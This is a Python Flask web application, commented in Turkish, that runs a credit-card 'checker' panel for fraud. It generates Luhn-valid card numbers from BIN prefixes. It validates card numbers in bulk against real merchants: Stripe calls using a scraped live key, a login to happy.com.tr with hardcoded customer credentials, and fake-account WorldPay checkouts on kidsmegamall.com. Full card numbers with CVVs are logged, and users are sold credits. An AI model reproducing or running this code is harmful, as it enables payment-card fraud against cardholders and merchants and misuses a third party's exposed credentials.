# app.py - Ana Flask Uygulaması
import os 
import urllib.parse
import sys
import re
import json
import time
import random
import string
import sqlite3
import hashlib
import secrets
import threading
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash, send_file
import requests
import urllib3
from werkzeug.security import generate_password_hash, check_password_hash

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== KONFIGURASYON ====================
app = Flask(__name__)
app.config['sk_test_51TtbUKJ7t7mG0eMkgfru6R5i7z3puOSW9tHC9pC6F9Yvw7nQX6Mn6fQfA1c0JKvOXye5FS5qhiBqnGFbXIw3P3m900CWzOmbKK'] = 'sifreli-anahtar-buraya-degistir-123456'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)

# ==================== ADMIN KONFIG ====================
ADMIN_TG_ID = "123456789"  # Admin Telegram ID
ADMIN_PASSWORD = "riven"
ADMIN_USERNAME = "riven1"
DAILY_CREDIT_LIMIT = 5000

# ==================== VERİTABANI ====================
DB_PATH = 'checker.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Kullanıcılar tablosu
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        tg_id TEXT UNIQUE NOT NULL,
        tg_username TEXT,
        credits INTEGER DEFAULT 1000,
        is_admin INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_reset DATE DEFAULT CURRENT_DATE
    )''')
    
    # Loglar tablosu
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        card TEXT,
        gateway TEXT,
        status TEXT,
        response TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY(user_id) REFERENCES users(id)
    )''')
    
    # Banlı IP'ler
    c.execute('''CREATE TABLE IF NOT EXISTS banned_ips (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT UNIQUE,
        reason TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # Admin hesabını kontrol et
    c.execute("SELECT * FROM users WHERE tg_id = ?", (ADMIN_TG_ID,))
    if not c.fetchone():
        hashed = generate_password_hash(ADMIN_PASSWORD)
        c.execute("INSERT INTO users (username, password, tg_id, tg_username, credits, is_admin) VALUES (?, ?, ?, ?, ?, ?)",
                  (ADMIN_USERNAME, hashed, ADMIN_TG_ID, "admin", 999999, 1))
    
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# ==================== DEKORATÖRLER ====================
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        conn = get_db()
        user = conn.execute("SELECT is_admin FROM users WHERE id = ?", (session['user_id'],)).fetchone()
        conn.close()
        if not user or not user['is_admin']:
            flash('Admin yetkisi gerekli!', 'error')
            return redirect(url_for('dashboard'))
        return f(*args, **kwargs)
    return decorated_function

def check_ban(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' in session:
            conn = get_db()
            user = conn.execute("SELECT is_banned FROM users WHERE id = ?", (session['user_id'],)).fetchone()
            conn.close()
            if user and user['is_banned']:
                session.clear()
                flash('Hesabınız yasaklanmış!', 'error')
                return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ==================== LUHN ALGORİTMASI ====================
def luhn_check(card):
    """Luhn algoritması ile kart doğrulama"""
    card = str(card).replace(" ", "")
    if not card.isdigit():
        return False
    total = 0
    reverse = card[::-1]
    for i, digit in enumerate(reverse):
        n = int(digit)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def generate_card(bin_prefix, count=1, card_type="any"):
    """BIN'den kart üret"""
    cards = []
    bin_prefix = str(bin_prefix).strip()
    
    # BIN uzunluğuna göre kart uzunluğu belirle
    if card_type.lower() in ["amex", "american express"]:
        length = 15
    else:
        length = 16
    
    # BIN'i tamamla
    while len(bin_prefix) < 6:
        bin_prefix += str(random.randint(0, 9))
    
    for _ in range(count):
        # Rastgele sayı üret
        card = bin_prefix
        while len(card) < length - 1:
            card += str(random.randint(0, 9))
        
        # Luhn kontrolü için son haneyi hesapla
        check_digit = 0
        for i in range(length - 1, -1, -1):
            digit = int(card[i]) if i < len(card) else 0
            if (length - i) % 2 == 0:
                digit *= 2
                if digit > 9:
                    digit -= 9
            check_digit += digit
        
        check_digit = (10 - (check_digit % 10)) % 10
        card = card[:length-1] + str(check_digit)
        cards.append(card)
    
    return cards

# ==================== API GATEWAY'LER ====================
class GatewayManager:
    def __init__(self):
        self.gateways = {
            'lachio': {
                'name': 'Lachio (Stripe)',
                'author': '@wortexbabax',
                'base_url': 'https://lachio.bg',
                'stripe_key': 'pk_live_51RwOhgRXJYeffe5ZMJ2T8l4GJ7chCWC26T1AwzfQl8ppReArnVJSsnDd4VCawUpQMXlVvTLVsitdm1VDZUD1CEjF00B7snlvgi'
            },
            'happy': {
                'name': 'Happy.com.tr',
                'author': '@wortexbabax',
                'base_url': 'https://www.happy.com.tr',
                'credentials': {
                    'email': 'sercankatirci@hotmail.com',
                    'password': 'h123456789'
                }
            },
            'kids': {
                'name': 'KidsMegamall (WorldPay)',
                'author': '@wortexbabax',
                'base_url': 'https://kidsmegamall.com'
            }
        }
    
    def check_lachio(self, card, mm, yy, cvv):
        """Lachio Gateway"""
        try:
            # Format düzenle
            if len(yy) == 4:
                yy2 = yy[-2:]
            else:
                yy2 = yy
            mm = mm.zfill(2)
            card = card.replace(" ", "")
            
            # Stripe Payment Method
            pm_data = {
                "type": "card",
                "card[number]": card,
                "card[cvc]": cvv,
                "card[exp_year]": yy2,
                "card[exp_month]": mm,
                "allow_redisplay": "unspecified",
                "billing_details[address][country]": "TR",
                "pasted_fields": "number",
                "payment_user_agent": "stripe.js/299e1ea907; stripe-js-v3/299e1ea907; payment-element; deferred-intent",
                "referrer": "https://lachio.bg",
                "time_on_page": str(random.randint(10000, 99999)),
                "key": "pk_live_51RwOhgRXJYeffe5ZMJ2T8l4GJ7chCWC26T1AwzfQl8ppReArnVJSsnDd4VCawUpQMXlVvTLVsitdm1VDZUD1CEjF00B7snlvgi",
                "_stripe_version": "2024-06-20",
            }
            
            resp = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                headers={
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                },
                data=pm_data,
                timeout=30
            )
            j = resp.json()
            
            if j.get("id", "").startswith("pm_"):
                return {"status": "approved", "message": "Card Valid - Stripe PM Created", "data": j}
            else:
                err = j.get("error", {}).get("message", "") or "Invalid Card"
                return {"status": "declined", "message": err, "data": j}
                
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def check_happy(self, card, mm, yy, cvv):
        """Happy.com.tr Gateway"""
        try:
            session = requests.Session()
            session.verify = False
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept-Language": "tr-TR,tr;q=0.9"
            })
            
            # Login
            r = session.get("https://www.happy.com.tr/index.php?route=account/login", timeout=15)
            csrf = self.extract(r.text, 'name="csrfToken" value="', '"')
            
            r = session.post("https://www.happy.com.tr/index.php?route=account/login",
                headers={"content-type": "application/x-www-form-urlencoded"},
                data=f"email={urllib.parse.quote('sercankatirci@hotmail.com')}&password={urllib.parse.quote('h123456789')}&csrfToken={urllib.parse.quote(csrf)}",
                timeout=15, allow_redirects=False)
            
            if 'location' not in r.headers:
                return {"status": "error", "message": "Login failed"}
            
            loc = r.headers['location']
            session.get(loc if loc.startswith('http') else "https://www.happy.com.tr" + loc, timeout=15)
            
            # Sepeti temizle
            r = session.get("https://www.happy.com.tr/index.php?route=checkout/cart", timeout=15)
            existing = re.findall(r'name="quantity\[(\d+)\]"', r.text)
            for pid in existing:
                session.get(f"https://www.happy.com.tr/index.php?route=checkout/cart&remove={pid}", timeout=15)
            
            # Ürün ekle
            session.post("https://www.happy.com.tr/index.php?route=checkout/cart/add",
                headers={"x-requested-with": "XMLHttpRequest"},
                data="quantity=1&product_id=137515", timeout=15)
            
            # Checkout
            r = session.get("https://www.happy.com.tr/index.php?route=checkout/checkout", timeout=15, allow_redirects=False)
            if r.status_code == 302:
                return {"status": "error", "message": "Product out of stock"}
            
            # CSRF al
            r = session.get("https://www.happy.com.tr/index.php?route=checkout/confirm",
                headers={"x-requested-with": "XMLHttpRequest"}, timeout=15)
            csrf_token = self.extract(r.text, 'csrfToken" value="', '"') or self.extract(r.text, 'name="csrfToken" value="', '"')
            
            if not csrf_token:
                return {"status": "error", "message": "CSRF token not found"}
            
            # Puan kontrolü
            yy = yy[-2:] if len(yy) > 2 else yy
            data = f"banka=garanti&cardtype=1&cardname=bonus&cc_number={card}&cc_month={mm}&cc_year={yy}&cc_cvv={cvv}&csrfToken={urllib.parse.quote(csrf_token)}"
            r = session.post("https://www.happy.com.tr/index.php?route=payment/creditcard/checkPoint",
                headers={"x-requested-with": "XMLHttpRequest"},
                data=data, timeout=15)
            
            try:
                j = r.json()
                if isinstance(j, dict) and not j.get("error"):
                    amount = j.get("amount", "0")
                    if float(amount) > 0:
                        return {"status": "approved", "message": f"Puan: {amount}", "data": j}
                    else:
                        return {"status": "declined", "message": "Puan: 0", "data": j}
                else:
                    err_msg = j.get("error", "unknown") if isinstance(j, dict) else str(j)
                    return {"status": "declined", "message": err_msg, "data": j}
            except:
                return {"status": "error", "message": "JSON parse error"}
                
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def check_kids(self, card, mm, yy, cvv):
        """KidsMegamall Gateway"""
        try:
            if len(yy) == 4:
                yy2 = yy
            else:
                yy2 = "20" + yy
            mm = mm.zfill(2)
            card = card.replace(" ", "")
            
            # Luhn kontrolü
            if not self.luhn(card):
                return {"status": "declined", "message": "Invalid card number (Luhn)"}
            
            session = requests.Session()
            session.verify = False
            
            # Kayıt ol
            rand = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
            email = f"{rand}@gmail.com"
            
            r = session.get("https://kidsmegamall.com/my-account/")
            m = re.search(r'woocommerce-register-nonce" value="([^"]+)"', r.text)
            if not m:
                return {"status": "error", "message": "Nonce not found"}
            
            session.cookies.clear()
            r = session.post("https://kidsmegamall.com/my-account/", data={
                "email": email, "password": email,
                "woocommerce-register-nonce": m.group(1),
                "_wp_http_referer": "/my-account/", "register": "Register",
            })
            
            if "wordpress_logged_in" not in str(session.cookies):
                return {"status": "error", "message": "Registration failed"}
            
            # Ürün bilgileri
            r = session.get("https://kidsmegamall.com/product/cute-fingerless-gloves/")
            m = re.search(r'name="add-to-cart" value="(\d+)"', r.text)
            if not m:
                return {"status": "error", "message": "Product ID not found"}
            product_id = m.group(1)
            
            m = re.search(r'data-product_variations="([^"]+)"', r.text)
            if not m:
                return {"status": "error", "message": "Variations not found"}
            variations = json.loads(m.group(1).replace("&quot;", '"').replace("&#092;", "\\"))
            
            # Style seç
            chosen_style = ""
            for opt in re.finditer(r'<option value="([^"]+)"', r.text):
                if opt.group(1):
                    chosen_style = opt.group(1)
                    break
            
            variation_id = "0"
            for v in variations:
                if v.get("attributes", {}).get("attribute_style") == chosen_style:
                    variation_id = str(v.get("variation_id", "0"))
                    break
            
            # Sepete ekle
            session.post("https://kidsmegamall.com/?wc-ajax=xoo_wsc_add_to_cart", data={
                "attribute_style": chosen_style, "quantity": "1",
                "add-to-cart": product_id, "product_id": product_id,
                "variation_id": variation_id, "action": "xoo_wsc_add_to_cart",
            })
            
            # Checkout
            r = session.get("https://kidsmegamall.com/checkout/")
            m = re.search(r'update_order_review_nonce":"([^"]+)"', r.text)
            security = m.group(1) if m else None
            m = re.search(r'woocommerce-process-checkout-nonce" value="([^"]+)"', r.text)
            checkout_nonce = m.group(1) if m else None
            m = re.search(r'checkout_id":"([^"]+)"', r.text)
            wp_identity = m.group(1) if m else "fb309fc7-a737-403f-b00b-199832a3b502"
            
            billing = {
                "billing_first_name": "Test", "billing_last_name": "User",
                "billing_country": "TR", "billing_address_1": "Test Address",
                "billing_postcode": "34000", "billing_city": "Istanbul",
                "billing_state": "TR34", "billing_phone": "5551234567",
                "billing_email": email,
            }
            
            # WorldPay session
            r = requests.post("https://access.worldpay.com/sessions/card",
                headers={
                    "accept": "application/vnd.worldpay.sessions-v1.hal+json",
                    "content-type": "application/vnd.worldpay.sessions-v1.hal+json",
                    "user-agent": "Mozilla/5.0",
                }, json={
                    "identity": wp_identity, "cardNumber": card,
                    "cardExpiryDate": {"month": int(mm), "year": int(yy2)},
                    "cvc": cvv,
                }, timeout=30, verify=False)
            
            try:
                wp_resp = r.json()
            except:
                wp_resp = {}
            
            session_href = wp_resp.get("_links", {}).get("sessions:session", {}).get("href", "")
            if not session_href:
                return {"status": "declined", "message": "WorldPay session failed"}
            
            # Checkout
            checkout_data = {
                **billing,
                "shipping_first_name": "Test", "shipping_last_name": "User",
                "shipping_country": "TR", "shipping_address_1": "Test Address",
                "shipping_postcode": "34000", "shipping_city": "Istanbul",
                "shipping_state": "TR34",
                "shipping_method[0]": "free_shipping:6",
                "payment_method": "access_worldpay_checkout",
                "card_holder_name": "Test User",
                "sessionState": session_href,
                "woocommerce-process-checkout-nonce": checkout_nonce,
                "_wp_http_referer": "/?wc-ajax=update_order_review",
            }
            r = session.post("https://kidsmegamall.com/?wc-ajax=checkout", data=checkout_data, timeout=30)
            
            try:
                chk = r.json()
            except:
                chk = {"result": "failure", "messages": "parse error"}
            
            if chk.get("result") != "failure":
                return {"status": "approved", "message": "Charged!", "data": chk}
            else:
                msg = self.strip_html(chk.get("messages", "Declined"))
                return {"status": "declined", "message": msg, "data": chk}
                
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def extract(self, txt, s, e):
        try:
            if s in txt:
                return txt.split(s, 1)[1].split(e, 1)[0]
            return ""
        except:
            return ""
    
    def luhn(self, ccn):
        s = 0
        for i, d in enumerate(reversed(ccn)):
            n = int(d)
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            s += n
        return s % 10 == 0
    
    def strip_html(self, msg):
        m = re.search(r'<li[^>]*>(.*?)</li>', msg, re.DOTALL)
        return m.group(1).strip() if m else re.sub(r'<[^>]+>', '', msg).strip()
    
    def check_card(self, gateway, card, mm, yy, cvv):
        """Gateway seçimine göre kart kontrolü"""
        if gateway == 'lachio':
            return self.check_lachio(card, mm, yy, cvv)
        elif gateway == 'happy':
            return self.check_happy(card, mm, yy, cvv)
        elif gateway == 'kids':
            return self.check_kids(card, mm, yy, cvv)
        else:
            return {"status": "error", "message": "Unknown gateway"}

gateway_manager = GatewayManager()


# ==================== ROUTES ====================
@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        conn = get_db()
        user = conn.execute("SELECT * FROM users WHERE username = ? OR tg_id = ?", (username, username)).fetchone()
        conn.close()
        
        if user and check_password_hash(user['password'], password):
            if user['is_banned']:
                flash('Hesabınız yasaklanmış!', 'error')
                return render_template('login.html')
            
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['is_admin'] = user['is_admin']
            session.permanent = True
            
            # Günlük kredi kontrolü
            check_daily_credits(user['id'])
            
            return redirect(url_for('dashboard'))
        else:
            flash('Kullanıcı adı veya şifre hatalı!', 'error')
    
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        tg_id = request.form.get('tg_id')
        tg_username = request.form.get('tg_username')
        
        if not username or not password or not tg_id:
            flash('Tüm alanları doldurun!', 'error')
            return render_template('register.html')
        
        conn = get_db()
        
        # Kullanıcı kontrolü
        existing = conn.execute("SELECT * FROM users WHERE username = ? OR tg_id = ?", (username, tg_id)).fetchone()
        if existing:
            conn.close()
            flash('Kullanıcı adı veya Telegram ID zaten kayıtlı!', 'error')
            return render_template('register.html')
        
        hashed = generate_password_hash(password)
        conn.execute("INSERT INTO users (username, password, tg_id, tg_username, credits) VALUES (?, ?, ?, ?, ?)",
                     (username, hashed, tg_id, tg_username, DAILY_CREDIT_LIMIT))
        conn.commit()
        conn.close()
        
        flash('Kayıt başarılı! Giriş yapabilirsiniz.', 'success')
        return redirect(url_for('login'))
    
    return render_template('register.html')

@app.route('/logout')
def logout():
    session.clear()
    flash('Çıkış yapıldı.', 'success')
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required
@check_ban
def dashboard():
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE id = ?", (session['user_id'],)).fetchone()
    logs = conn.execute("SELECT * FROM logs WHERE user_id = ? ORDER BY id DESC LIMIT 20", (session['user_id'],)).fetchall()
    conn.close()
    return render_template('dashboard.html', user=user, logs=logs)

@app.route('/check', methods=['POST'])
@login_required
@check_ban
def check_card():
    try:
        data = request.json
        card = data.get('card', '').strip()
        mm = data.get('mm', '').strip()
        yy = data.get('yy', '').strip()
        cvv = data.get('cvv', '').strip()
        gateway = data.get('gateway', 'lachio')
        user_id = session['user_id']
        
        # Kredi kontrolü
        conn = get_db()
        user = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
        
        # Admin hariç kredi kontrolü
        if not user['is_admin']:
            check_daily_credits(user_id)
            user = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
            if user['credits'] <= 0:
                conn.close()
                return jsonify({'error': 'Kredi yetersiz! Günlük limit: ' + str(DAILY_CREDIT_LIMIT)})
        
        # Kart kontrolü
        result = gateway_manager.check_card(gateway, card, mm, yy, cvv)
        
        # Log kaydet
        conn.execute("INSERT INTO logs (user_id, card, gateway, status, response) VALUES (?, ?, ?, ?, ?)",
                     (user_id, f"{card}|{mm}|{yy}|{cvv}", gateway, result['status'], json.dumps(result)))
        
        # Kredi düş (admin hariç)
        if not user['is_admin']:
            conn.execute("UPDATE users SET credits = credits - 1 WHERE id = ?", (user_id,))
        
        conn.commit()
        conn.close()
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/mass_check', methods=['POST'])
@login_required
@check_ban
def mass_check():
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'Dosya seçilmedi'})
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'Dosya seçilmedi'})
        
        gateway = request.form.get('gateway', 'lachio')
        user_id = session['user_id']
        
        # Kredi kontrolü
        conn = get_db()
        user = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
        
        if not user['is_admin']:
            check_daily_credits(user_id)
            user = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
        
        # Dosyayı oku
        content = file.read().decode('utf-8')
        lines = content.strip().split('\n')
        
        results = {
            'total': 0,
            'approved': [],
            'declined': [],
            'errors': []
        }
        
        for line in lines:
            if not line.strip():
                continue
            
            parts = line.split('|')
            if len(parts) < 4:
                results['errors'].append(line + ' (Hatalı format)')
                continue
            
            card, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            
            # Kredi kontrolü
            if not user['is_admin'] and user['credits'] <= 0:
                results['errors'].append(f"{card}|{mm}|{yy}|{cvv} (Kredi yetersiz)")
                continue
            
            # Kontrol yap
            result = gateway_manager.check_card(gateway, card, mm, yy, cvv)
            
            # Log kaydet
            conn.execute("INSERT INTO logs (user_id, card, gateway, status, response) VALUES (?, ?, ?, ?, ?)",
                         (user_id, f"{card}|{mm}|{yy}|{cvv}", gateway, result['status'], json.dumps(result)))
            
            # Kredi düş
            if not user['is_admin']:
                conn.execute("UPDATE users SET credits = credits - 1 WHERE id = ?", (user_id,))
                user = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
            
            results['total'] += 1
            if result['status'] == 'approved':
                results['approved'].append(f"{card}|{mm}|{yy}|{cvv} - {result['message']}")
            else:
                results['declined'].append(f"{card}|{mm}|{yy}|{cvv} - {result['message']}")
            
            # Admin bildirimi
            if result['status'] == 'error':
                send_admin_notification(f"⚠️ Hata: {card}|{mm}|{yy}|{cvv}\nGateway: {gateway}\nHata: {result['message']}")
        
        conn.commit()
        conn.close()
        
        return jsonify(results)
        
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/generate_cards', methods=['POST'])
@login_required
def generate_cards():
    try:
        data = request.json
        bin_input = data.get('bin', '').strip()
        count = int(data.get('count', 1))
        card_type = data.get('card_type', 'any')
        random_gen = data.get('random', False)
        
        if not bin_input and not random_gen:
            return jsonify({'error': 'BIN veya Random seçilmelidir'})
        
        cards = []
        if random_gen:
            # Rastgele BIN üret
            for _ in range(count):
                bin_prefix = ''.join([str(random.randint(0, 9)) for _ in range(6)])
                generated = generate_card(bin_prefix, 1, card_type)
                cards.extend(generated)
        else:
            cards = generate_card(bin_input, count, card_type)
        
        return jsonify({'cards': cards})
        
    except Exception as e:
        return jsonify({'error': str(e)})

# ==================== ADMIN ROUTES ====================
@app.route('/admin')
@login_required
@admin_required
def admin_panel():
    conn = get_db()
    users = conn.execute("SELECT * FROM users ORDER BY id DESC").fetchall()
    logs = conn.execute("SELECT * FROM logs ORDER BY id DESC LIMIT 50").fetchall()
    conn.close()
    return render_template('admin.html', users=users, logs=logs)

@app.route('/admin/ban', methods=['POST'])
@login_required
@admin_required
def admin_ban():
    try:
        data = request.json
        user_id = data.get('user_id')
        action = data.get('action')  # 'ban' veya 'unban'
        
        conn = get_db()
        if action == 'ban':
            conn.execute("UPDATE users SET is_banned = 1 WHERE id = ?", (user_id,))
            send_admin_notification(f"🚫 Kullanıcı ID: {user_id} yasaklandı")
        else:
            conn.execute("UPDATE users SET is_banned = 0 WHERE id = ?", (user_id,))
            send_admin_notification(f"✅ Kullanıcı ID: {user_id} yasağı kaldırıldı")
        
        conn.commit()
        conn.close()
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/admin/credits', methods=['POST'])
@login_required
@admin_required
def admin_credits():
    try:
        data = request.json
        user_id = data.get('user_id')
        credits = int(data.get('credits', 0))
        
        conn = get_db()
        conn.execute("UPDATE users SET credits = credits + ? WHERE id = ?", (credits, user_id))
        conn.commit()
        conn.close()
        
        send_admin_notification(f"💰 Kullanıcı ID: {user_id} - {credits} kredi eklendi")
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'error': str(e)})

# ==================== YARDIMCI FONKSİYONLAR ====================
def check_daily_credits(user_id):
    """Günlük kredi resetleme"""
    conn = get_db()
    user = conn.execute("SELECT credits, last_reset FROM users WHERE id = ?", (user_id,)).fetchone()
    
    if user:
        last_reset = datetime.strptime(user['last_reset'], '%Y-%m-%d') if user['last_reset'] else datetime.now()
        today = datetime.now().date()
        
        if last_reset.date() < today:
            conn.execute("UPDATE users SET credits = ?, last_reset = ? WHERE id = ?", 
                        (DAILY_CREDIT_LIMIT, today.strftime('%Y-%m-%d'), user_id))
            conn.commit()
    
    conn.close()

def send_admin_notification(message):
    """Admin Telegram bildirimi"""
    try:
        # Telegram bot ile bildirim gönder
        bot_token = "YOUR_BOT_TOKEN_HERE"
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            "chat_id": ADMIN_TG_ID,
            "text": f"🔔 **Checker Panel Bildirimi**\n\n{message}",
            "parse_mode": "Markdown"
        }
        requests.post(url, json=data, timeout=5)
    except:
        pass  # Sessizce başarısız ol

# ==================== HTML TEMPLATES ====================
# Bu template'ler ayrı dosyalar olarak kaydedilmeli
# Basitçe render_template ile kullanılacak

# ==================== MAIN ====================
if __name__ == '__main__':
    print("=" * 60)
    print("Card Checker Panel")
    print("Admin Telegram ID:", ADMIN_TG_ID)
    print("Admin Şifre:", ADMIN_PASSWORD)
    print("=" * 60)
    
    # Admin bildirimi
    send_admin_notification("🚀 Panel başlatıldı!")
    
    app.run(host='0.0.0.0', port=5000, debug=False)